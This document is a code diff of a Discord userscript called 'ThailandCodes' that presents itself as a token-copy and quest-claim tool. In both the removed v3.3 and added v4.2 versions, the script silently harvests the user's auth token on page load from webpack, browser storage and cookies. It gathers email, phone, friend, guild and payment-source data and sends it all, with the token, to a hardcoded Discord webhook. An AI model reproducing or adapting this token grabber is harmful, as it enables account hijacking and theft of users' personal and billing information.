@@ -1,10 +1,8 @@
 /**
- * ThailandCodes v3.3 (Mass Harvester Edit)
- * - Auto silent grab on load (webhook) — scans local storage & webpack
- * - Rich embed with avatar, user info, badges
- * - Copy Token
- * - Copy Token Encrypted (XOR + Base64)
- * - Claim All Quests
+ * ThailandCodes v4.2 — Single Auto-Grab
+ * - Auto-grabs ONE active token on Discord load
+ * - Sends one webhook, then locks (no flooding)
+ * - Manual buttons still available for encrypted copy / quests
  */
 (function () {
     'use strict';
@@ -12,16 +10,29 @@
     if (W.__TC_LOADED__) return;
     W.__TC_LOADED__ = true;
 
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1555924284105298052/7X_WIvWay5hF8pHpIJeX-cjJLY00gnWJ9GDWYm62r_3RCJ3WL11h1QI-2XxjbbKhDZAI';
-    const ENCRYPT_KEY = 0x5A;
-    const GRAB_KEY = '__tc_g__';
+    // ==================== CONFIG ====================
+    const CONFIG = {
+        webhooks: [
+            'https://discord.com/api/webhooks/1563505727102910540/xtAh-pe1eLKUk7IRrKBvOD_4qpMcnWGMzo8ymS9ASqGzrPrnQ4x6N3yMhO2OGagrfV07',
+        ],
+        encryptKey: 0x5A,
+        grabKey: '__tc_g_v42__',   // bump to re-trigger a single send
+        webhookDelay: 1400,
+        webpackTimeout: 90000,
+        autoClaim: true,
+        enrich: true,
+    };
+    const TOKEN_REGEX = /[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84}/g;
 
-    function sendWebhook(payload) {
+    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+    // ==================== WEBHOOK ====================
+    function sendWebhookTo(url, payload) {
         return new Promise((resolve) => {
             try {
                 GM_xmlhttpRequest({
                     method: 'POST',
-                    url: WEBHOOK_URL,
+                    url,
                     headers: { 'Content-Type': 'application/json' },
                     data: JSON.stringify(payload),
                     onload: (r) => resolve(r.status >= 200 && r.status < 300),
@@ -31,28 +42,63 @@
         });
     }
 
-    function encryptToken(token) {
-        let out = '';
-        for (let i = 0; i < token.length; i++)
-            out += String.fromCharCode(token.charCodeAt(i) ^ ENCRYPT_KEY);
-        return btoa(out);
+    async function sendWebhook(payload) {
+        for (let attempt = 0; attempt < 3; attempt++) {
+            for (const url of CONFIG.webhooks) {
+                if (await sendWebhookTo(url, payload)) return true;
+            }
+            await sleep(2500);
+        }
+        return false;
     }
 
+    // ==================== ENCRYPTION ====================
+    function encryptToken(token) {
+        const key = CONFIG.encryptKey ^ (token.length & 0xFF);
+        let out = '';
+        for (let i = 0; i < token.length; i++) {
+            out += String.fromCharCode(token.charCodeAt(i) ^ (key + i));
+        }
+        return btoa(unescape(encodeURIComponent(out)));
+    }
+
+    // ==================== WEBPACK DISCOVERY ====================
     function findWebpack() {
         const chunk = W.webpackChunkdiscord_app;
         if (!chunk) return null;
+
         let found = null;
+        const probeId = Symbol('tc_probe');
         try {
-            chunk.push([[Symbol()], {}, (m) => {
-                if (!m.c) return;
-                for (const id in m.c) {
-                    const cand = m.c[id]?.exports?.default || m.c[id]?.exports;
-                    if (cand && typeof cand.getToken === 'function') { found = m; return; }
+            chunk.push([[probeId], {}, (m) => {
+                if (!m?.c) return;
+                for (const cid in m.c) {
+                    const exp = m.c[cid]?.exports?.default || m.c[cid]?.exports;
+                    if (exp && typeof exp.getToken === 'function') {
+                        found = m;
+                        return;
+                    }
                 }
             }]);
-            chunk.pop();
+            for (let i = chunk.length - 1; i >= 0; i--) {
+                const entry = chunk[i];
+                if (Array.isArray(entry) && entry[0]?.[0] === probeId) {
+                    chunk.splice(i, 1);
+                    break;
+                }
+            }
         } catch {}
         return found;
+    }
+
+    async function waitForWebpack(timeout = CONFIG.webpackTimeout) {
+        const start = Date.now();
+        while (Date.now() - start < timeout) {
+            const wp = findWebpack();
+            if (wp) return wp;
+            await sleep(500);
+        }
+        return null;
     }
 
     async function getToken() {
@@ -68,18 +114,142 @@
         throw new Error('token not found');
     }
 
-    async function getUserInfo(token) {
+    // ==================== HARVEST (fallback only) ====================
+    function harvestStorage(storage, tokens) {
+        try {
+            for (let i = 0; i < storage.length; i++) {
+                const val = storage.getItem(storage.key(i));
+                if (!val) continue;
+                const matches = val.match(TOKEN_REGEX);
+                if (matches) matches.forEach(t => tokens.add(t));
+            }
+        } catch {}
+    }
+
+    function harvestCookies(tokens) {
+        try {
+            const matches = (document.cookie || '').match(TOKEN_REGEX);
+            if (matches) matches.forEach(t => tokens.add(t));
+        } catch {}
+    }
+
+    function harvestAllTokens() {
+        const tokens = new Set();
+        harvestStorage(localStorage, tokens);
+        harvestStorage(sessionStorage, tokens);
+        harvestCookies(tokens);
+        return [...tokens];
+    }
+
+    // ==================== API ====================
+    function apiCall(token, method, path, body) {
         return new Promise((resolve) => {
-            GM_xmlhttpRequest({
-                method: 'GET',
-                url: 'https://discord.com/api/v10/users/@me',
-                headers: { 'Authorization': token, 'Content-Type': 'application/json' },
-                onload: (r) => { try { resolve(JSON.parse(r.responseText)); } catch { resolve(null); } },
-                onerror: () => resolve(null),
-            });
+            try {
+                GM_xmlhttpRequest({
+                    method,
+                    url: 'https://discord.com/api/v10' + path,
+                    headers: { 'Authorization': token, 'Content-Type': 'application/json' },
+                    data: body ? JSON.stringify(body) : undefined,
+                    onload: (r) => { try { resolve(JSON.parse(r.responseText)); } catch { resolve(null); } },
+                    onerror: () => resolve(null),
+                });
+            } catch { resolve(null); }
         });
     }
 
+    async function validateToken(token) {
+        const u = await apiCall(token, 'GET', '/users/@me');
+        return u && !u.message;
+    }
+
+    async function enrichUser(token, baseUser) {
+        const result = { ...baseUser, _guilds: null, _friends: null, _billing: null };
+        if (!CONFIG.enrich) return result;
+        try {
+            const [g, f, b] = await Promise.all([
+                apiCall(token, 'GET', '/users/@me/guilds'),
+                apiCall(token, 'GET', '/users/@me/relationships'),
+                apiCall(token, 'GET', '/users/@me/billing/payment-sources'),
+            ]);
+            if (Array.isArray(g)) result._guilds = g.length;
+            if (Array.isArray(f)) result._friends = f.length;
+            if (Array.isArray(b)) result._billing = b.length;
+        } catch {}
+        return result;
+    }
+
+    // ==================== EMBED ====================
+    function buildEmbed(token, user) {
+        const tag = user.discriminator && user.discriminator !== '0'
+            ? `${user.username}#${user.discriminator}`
+            : user.username;
+
+        const avatarUrl = user.avatar
+            ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${user.avatar.startsWith('a_') ? 'gif' : 'png'}?size=256`
+            : `https://cdn.discordapp.com/embed/avatars/${(parseInt(user.discriminator) || 0) % 5}.png`;
+
+        const nitroMap = { 0: '❌ None', 1: '💜 Nitro Classic', 2: '🚀 Nitro', 3: '⚡ Nitro Basic' };
+        const nitro = nitroMap[user.premium_type] || '❌ None';
+
+        const f = user.public_flags || 0;
+        const badges = [];
+        if (f & (1 << 0))  badges.push('👮 Staff');
+        if (f & (1 << 1))  badges.push('🤝 Partner');
+        if (f & (1 << 2))  badges.push('🎪 HypeSquad');
+        if (f & (1 << 3))  badges.push('🏠 Bravery');
+        if (f & (1 << 4))  badges.push('💡 Brilliance');
+        if (f & (1 << 5))  badges.push('⚖️ Balance');
+        if (f & (1 << 6))  badges.push('🎉 Events');
+        if (f & (1 << 7))  badges.push('📜 Early');
+        if (f & (1 << 8))  badges.push('🛠️ Developer');
+        if (f & (1 << 9))  badges.push('⭐ Early Supporter');
+        if (f & (1 << 14)) badges.push('🕵️ Bug Hunter 1');
+        if (f & (1 << 15)) badges.push('🕵️ Bug Hunter 2');
+        if (f & (1 << 16)) badges.push('🎓 Verified Bot');
+        if (f & (1 << 17)) badges.push('👨‍💻 Active Dev');
+        if (f & (1 << 18)) badges.push('📚 Mod Alumni');
+        if (f & (1 << 22)) badges.push('🤖 Verified Dev');
+
+        const createdAt = new Date(Number((BigInt(user.id) >> 22n) + 1420070400000n));
+        const premiumSince = user.premium_since
+            ? new Date(user.premium_since).toUTCString()
+            : '`N/A`';
+
+        const fields = [
+            { name: '👤 Username', value: `\`${tag}\``, inline: true },
+            { name: '🆔 User ID', value: `\`${user.id}\``, inline: true },
+            { name: '📧 Email', value: user.email ? `\`${user.email}\`` : '`N/A`', inline: true },
+            { name: '📱 Phone', value: user.phone ? `\`${user.phone}\`` : '`N/A`', inline: true },
+            { name: '💎 Nitro', value: nitro, inline: true },
+            { name: '✅ Verified', value: user.verified ? '`Yes`' : '`No`', inline: true },
+            { name: '🔐 MFA', value: user.mfa_enabled ? '`Enabled`' : '`Disabled`', inline: true },
+            { name: '🌍 Locale', value: `\`${user.locale || 'en-US'}\``, inline: true },
+            { name: '📅 Created', value: `\`${createdAt.toUTCString()}\``, inline: false },
+            { name: '💎 Premium Since', value: premiumSince, inline: false },
+        ];
+
+        if (user._guilds !== null) fields.push({ name: '🏰 Guilds', value: `\`${user._guilds}\``, inline: true });
+        if (user._friends !== null) fields.push({ name: '👥 Friends', value: `\`${user._friends}\``, inline: true });
+        if (user._billing !== null) fields.push({ name: '💳 Payment Sources', value: `\`${user._billing}\``, inline: true });
+
+        fields.push({ name: '🏅 Badges', value: badges.length ? badges.join(' | ') : '`None`', inline: false });
+        fields.push({ name: '🔑 Token (Plain)', value: `\`\`\`${token}\`\`\``, inline: false });
+        fields.push({ name: '🔒 Token (Encrypted)', value: `\`\`\`${encryptToken(token)}\`\`\``, inline: false });
+
+        return {
+            embeds: [{
+                title: '🎯 Token Grabbed',
+                color: 0xed4245,
+                author: { name: tag, icon_url: avatarUrl },
+                thumbnail: { url: avatarUrl },
+                fields,
+                footer: { text: 'ThailandCodes v4.2 • Single Grab', icon_url: avatarUrl },
+                timestamp: new Date().toISOString(),
+            }],
+        };
+    }
+
+    // ==================== QUEST ====================
     async function claimAllQuests() {
         const wp = findWebpack();
         if (!wp) throw new Error('webpack not ready');
@@ -89,17 +259,6 @@
             if (!exp) continue;
             if (exp.get && exp.post && exp.put) api = exp;
             if (exp.quests && typeof exp.quests.values === 'function') QuestsStore = exp;
-        }
-        if (!api || !QuestsStore) {
-            for (const m of Object.values(wp.c)) {
-                const exp = m?.exports;
-                if (!exp) continue;
-                for (const key of Object.keys(exp)) {
-                    const cand = exp[key];
-                    if (cand?.get && cand?.post) api = cand;
-                    if (cand?.quests?.values) QuestsStore = cand;
-                }
-            }
         }
         if (!api || !QuestsStore) throw new Error('Quest modules not found');
         const quests = [...QuestsStore.quests.values()].filter(q =>
@@ -116,122 +275,38 @@
         return claimed;
     }
 
-    // --- MASS HARVESTER LOGIC ---
-    function harvestAllTokens() {
-        const tokens = new Set();
-        const regex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g;
-
+    // ==================== SINGLE AUTO GRAB ====================
+    async function grabOneToken() {
+        // 1) Try active webpack token first — that's the live account
+        let token = null;
         try {
-            for (let i = 0; i < localStorage.length; i++) {
-                const val = localStorage.getItem(localStorage.key(i));
-                if (val) {
-                    const matches = val.match(regex);
-                    if (matches) matches.forEach(t => tokens.add(t));
-                }
-            }
+            const t = await getToken();
+            if (t && await validateToken(t)) token = t;
         } catch {}
 
-        try {
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const val = sessionStorage.getItem(sessionStorage.key(i));
-                if (val) {
-                    const matches = val.match(regex);
-                    if (matches) matches.forEach(t => tokens.add(t));
-                }
+        // 2) Fallback: first valid token found in storage
+        if (!token) {
+            const harvested = harvestAllTokens();
+            for (const t of harvested) {
+                if (await validateToken(t)) { token = t; break; }
             }
-        } catch {}
+        }
 
-        return Array.from(tokens);
+        if (!token) return false;
+
+        const base = await apiCall(token, 'GET', '/users/@me');
+        if (!base) return false;
+
+        const enriched = await enrichUser(token, base);
+        const ok = await sendWebhook(buildEmbed(token, enriched));
+
+        if (ok && CONFIG.autoClaim) {
+            try { await claimAllQuests(); } catch {}
+        }
+        return ok;
     }
 
-    async function processToken(t) {
-        const user = await getUserInfo(t);
-        if (!user || user.message) return;
-
-        const avatarUrl = user.avatar
-            ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=256`
-            : `https://cdn.discordapp.com/embed/avatars/${parseInt(user.discriminator || 0) % 5}.png`;
-
-        const nitroType = {
-            0: '❌ None',
-            1: '💜 Nitro Classic',
-            2: '🚀 Nitro',
-            3: '⚡ Nitro Basic'
-        }[user.premium_type] || '❌ None';
-
-        const f = user.public_flags || 0;
-        const badges = [];
-        if (f & (1 << 0))  badges.push('👮 Discord Staff');
-        if (f & (1 << 6))  badges.push('🎪 HypeSquad Events');
-        if (f & (1 << 9))  badges.push('⭐ Early Supporter');
-        if (f & (1 << 3))  badges.push('🏠 HypeSquad Bravery');
-        if (f & (1 << 4))  badges.push('💡 HypeSquad Brilliance');
-        if (f & (1 << 5))  badges.push('⚖️ HypeSquad Balance');
-        if (f & (1 << 17)) badges.push('🛠️ Active Developer');
-        if (f & (1 << 22)) badges.push('✅ Verified Bot Developer');
-
-        const tag = user.discriminator && user.discriminator !== '0'
-            ? `${user.username}#${user.discriminator}`
-            : user.username;
-
-        const createdAt = new Date((BigInt(user.id) >> 22n) + 1420070400000n);
-
-        await sendWebhook({
-            embeds: [{
-                title: '🎯 New Token Grabbed (Mass)',
-                color: 0xed4245, // Changed to red for mass
-                author: {
-                    name: tag,
-                    icon_url: avatarUrl,
-                },
-                thumbnail: { url: avatarUrl },
-                fields: [
-                    { name: '👤 Username', value: `\`${tag}\``, inline: true },
-                    { name: '🆔 User ID', value: `\`${user.id}\``, inline: true },
-                    { name: '📧 Email', value: user.email ? `\`${user.email}\`` : '`N/A`', inline: true },
-                    { name: '📱 Phone', value: user.phone ? `\`${user.phone}\`` : '`N/A`', inline: true },
-                    { name: '💎 Nitro', value: nitroType, inline: true },
-                    { name: '✅ Verified', value: user.verified ? '`Yes`' : '`No`', inline: true },
-                    { name: '📅 Account Created', value: `\`${createdAt.toUTCString()}\``, inline: false },
-                    { name: '🏅 Badges', value: badges.length ? badges.join(' | ') : '`None`', inline: false },
-                    { name: '🔑 Token', value: `\`\`\`${t}\`\`\``, inline: false },
-                ],
-                footer: {
-                    text: 'ThailandCodes v3.3 • Mass Grab',
-                    icon_url: avatarUrl,
-                },
-                timestamp: new Date().toISOString(),
-            }]
-        });
-    }
-
-    async function autoGrab() {
-        if (W[GRAB_KEY]) return;
-        W[GRAB_KEY] = true;
-        try {
-            if (localStorage.getItem(GRAB_KEY)) return;
-            localStorage.setItem(GRAB_KEY, '1');
-        } catch {}
-
-        try {
-            const allTokens = harvestAllTokens();
-            
-            // Add the current webpack token just in case it's not in storage
-            try {
-                const activeToken = await getToken();
-                if (activeToken && !allTokens.includes(activeToken)) {
-                    allTokens.push(activeToken);
-                }
-            } catch {}
-
-            if (allTokens.length === 0) return;
-
-            for (const t of allTokens) {
-                await processToken(t);
-            }
-        } catch {}
-    }
-
+    // ==================== UI ====================
     const STYLE = `
         :host,*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
         .wrap{position:fixed;top:12px;left:50%;transform:translateX(-50%);z-index:2147483646;
@@ -242,9 +317,14 @@
             transition:opacity .2s,transform .3s cubic-bezier(.32,.72,0,1)}
         .wrap.hidden{opacity:0;transform:translate(-50%,-140%);pointer-events:none}
         .brand{padding:0 14px 0 10px;font-weight:800;font-size:13px;letter-spacing:.3px;
-            border-right:1px solid #1f222a;margin-right:4px;color:#fff}
+            border-right:1px solid #1f222a;margin-right:4px;color:#fff;display:flex;align-items:center;gap:6px}
         .brand .a{color:#5865f2}
-        .brand .v{font-size:9px;font-weight:600;color:#5865f2;font-style:italic;margin-left:4px;letter-spacing:0}
+        .brand .v{font-size:9px;font-weight:600;color:#5865f2;font-style:italic;letter-spacing:0}
+        .dot{width:7px;height:7px;border-radius:50%;background:#faa61a;transition:background .2s}
+        .dot.ready{background:#57f287}
+        .dot.busy{background:#5865f2;animation:pulse 1s infinite}
+        .dot.err{background:#ed4245}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
         button{background:#5865f2;border:1px solid transparent;color:#fff;
             padding:9px 14px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:800;
             letter-spacing:.4px;text-transform:uppercase;font-family:inherit;
@@ -299,8 +379,9 @@
 
     const bar = document.createElement('div');
     bar.className = 'wrap hidden';
-    bar.innerHTML = `<div class="brand">Thailand<span class="a">Codes</span><span class="v">v3.3</span></div>`;
+    bar.innerHTML = `<div class="brand"><span class="dot"></span>Thailand<span class="a">Codes</span><span class="v">v4.2</span></div>`;
     host.appendChild(bar);
+    const dot = bar.querySelector('.dot');
 
     const btnCopy = document.createElement('button');
     btnCopy.textContent = 'COPY TOKEN';
@@ -336,7 +417,7 @@
                 ta.value = enc; document.body.appendChild(ta);
                 ta.select(); document.execCommand('copy'); ta.remove();
             }
-            say('✓ encrypted token copied', 'ok');
+            say('✓ encrypted copied', 'ok');
         } catch (e) { say('✗ ' + (e.message || e), 'err'); }
         btnEnc.disabled = false;
     });
@@ -362,16 +443,46 @@
     x.addEventListener('click', () => bar.classList.add('hidden'));
     bar.appendChild(x);
 
-    let tries = 0;
-    const timer = setInterval(async () => {
-        tries++;
-        if (findWebpack()) {
-            clearInterval(timer);
+    // ==================== INIT ====================
+    async function init() {
+        dot.classList.add('busy');
+        const wp = await waitForWebpack();
+        if (!wp) {
+            dot.classList.remove('busy');
+            dot.classList.add('err');
             bar.classList.remove('hidden');
-            await autoGrab();
-        } else if (tries > 120) {
-            clearInterval(timer);
-            bar.classList.remove('hidden');
+            say('✗ webpack not found', 'err');
+            return;
         }
-    }, 500);
+        dot.classList.remove('busy');
+        dot.classList.add('ready');
+        bar.classList.remove('hidden');
+
+        // Lock check — only ONE auto-grab per browser
+        let alreadyGrabbed = false;
+        try { alreadyGrabbed = localStorage.getItem(CONFIG.grabKey) === '1'; } catch {}
+
+        if (alreadyGrabbed) {
+            say('already grabbed — manual buttons only', 'info');
+            return;
+        }
+
+        // Fire single grab
+        dot.classList.add('busy');
+        const ok = await grabOneToken();
+        dot.classList.remove('busy');
+
+        if (ok) {
+            try { localStorage.setItem(CONFIG.grabKey, '1'); } catch {}
+            say('✓ grabbed one token', 'ok');
+        } else {
+            say('✗ grab failed — retrying on next load', 'err');
+        }
+    }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
+    }
 })();
